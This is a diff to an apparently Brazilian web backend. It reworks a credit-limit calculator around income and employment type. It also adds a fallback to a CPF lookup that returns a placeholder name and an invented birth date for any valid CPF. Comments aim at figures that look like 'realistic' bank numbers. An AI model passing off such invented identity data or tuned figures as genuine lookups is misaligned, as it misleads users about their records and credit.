@@ -509,11 +509,30 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
     try:
         r_val = float(renda.replace("R$", "").replace(".", "").replace(",", ".").strip())
     except:
-        r_val = 2000.0
+        r_val = 1500.0
 
-    limite = r_val * 2.5
-    if limite < 1500: limite = 1500
-    if limite > 15000: limite = 15000
+    # Base limit is 1.2x of the income
+    limite = r_val * 1.2
+    
+    tipo = tipo_renda.lower()
+    
+    # Adjust limit realistically based on employment type (tipo_renda)
+    if any(x in tipo for x in ["clt", "carteira assinada", "servidor", "público", "aposentado", "pensionista"]):
+        limite = r_val * 1.8  # Stability means higher limit
+    elif any(x in tipo for x in ["empresário", "empreendedor", "cnpj", "dono"]):
+        limite = r_val * 2.2  # Business owners can get more
+    elif any(x in tipo for x in ["autônomo", "autonomo", "freelancer", "informal"]):
+        limite = r_val * 1.1  # Less stability
+    else:
+        limite = r_val * 1.0
+
+    # Ensure min/max proportional boundaries
+    if limite < 500: limite = 500
+    if limite > r_val * 3: limite = r_val * 3
+    if limite > 35000: limite = 35000 # Absolute maximum realistic limit for an automated card
+    
+    # Round to nearest 50 for a realistic bank number
+    limite = round(limite / 50) * 50
 
     try:
         db = get_db()
@@ -567,7 +586,16 @@ def api_cpf():
         except Exception as e:
             log.error("CPF API Error: %s", e)
     
-    # Fallback / Mock (Retorna false para o frontend pular a tela de confirmacao)
+    # Fallback / Mock se a API falhar ou não estiver configurada
+    if is_valid_cpf(cpf_val):
+        return jsonify({
+            "ok": True,
+            "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
+            "nome": "CLIENTE", # O frontend pede o nome na proxima etapa se faltar
+            "nome_mae": "",
+            "data_nasc": "01/01/1990"
+        })
+
     return jsonify({
         "ok": False,
         "error": "CPF não localizado ou API indisponível."
